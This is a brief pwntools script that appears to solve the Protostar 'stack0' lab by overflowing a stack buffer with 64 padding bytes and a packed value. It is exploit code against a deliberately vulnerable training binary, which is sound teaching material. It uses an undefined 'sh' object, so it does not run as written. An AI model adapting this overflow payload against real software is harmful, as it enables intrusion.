#!/usr/bin/python
from pwn import *
from ssh import *

binarypath='/opt/protostar/bin/stack0'
p=sh.run(binarypath)
payload="A"*64+p32(0x1)
p.sendline(payload)
print p.recvall()